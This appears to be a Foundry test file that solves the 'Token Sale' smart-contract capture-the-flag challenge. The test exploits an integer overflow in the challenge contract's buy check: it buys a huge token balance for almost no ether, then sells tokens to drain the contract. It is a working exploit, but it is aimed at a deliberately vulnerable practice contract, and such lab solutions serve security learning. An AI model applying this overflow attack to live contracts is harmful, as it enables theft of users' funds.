// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {TokenSaleChallenge} from "../../src/2-Math/1-TokenSale.sol";

contract TokenSaleTest is Test {
    address player;

    address challengeAddress;

    function setUp() public {
        player = makeAddr("player");
        TokenSaleChallenge challenge = new TokenSaleChallenge{value: 1 ether}(payable(player));
        challengeAddress = payable(address(challenge));

        vm.deal(player, 10 ether);
    }

    function testSolveTokenSale() public {
        TokenSaleChallenge challenge = TokenSaleChallenge(payable(challengeAddress));

        // [START]

        // 1 ether -> 10^18
        // uint256 -> 2^256

        uint256 PRICE_PER_TOKEN = 1 ether;
        // Calculate number which will lead to an overflow in the require statement
        uint256 numTokens = (type(uint256).max / PRICE_PER_TOKEN) + 1;
        // Calculate corresponding msg.value
        uint256 ethValue = numTokens * PRICE_PER_TOKEN;

        // console.log("numTokens: ", numTokens);
        // console.log("ethValue: ", ethValue);
        console.log("(target) balance: ", address(challenge).balance);
        console.log("(palyer) balance: ", player.balance);
        console.log("(palyer) balanceOf: ", challenge.balanceOf(player));

        vm.startPrank(player);
        // Buy huge amount of tokens because of the overflow
        challenge.buy{value: ethValue}(numTokens);
        // Sell max amount of tokens by checking the balance of the challenge contract
        uint256 sellableAmount = address(challenge).balance / PRICE_PER_TOKEN;
        challenge.sell(sellableAmount);
        vm.stopPrank();

        console.log("-----");
        console.log("(target) balance: ", address(challenge).balance);
        console.log("(palyer) balance: ", player.balance);
        console.log("(palyer) balanceOf: ", challenge.balanceOf(player));

        // [END]

        assertTrue(challenge.isComplete());
    }
}
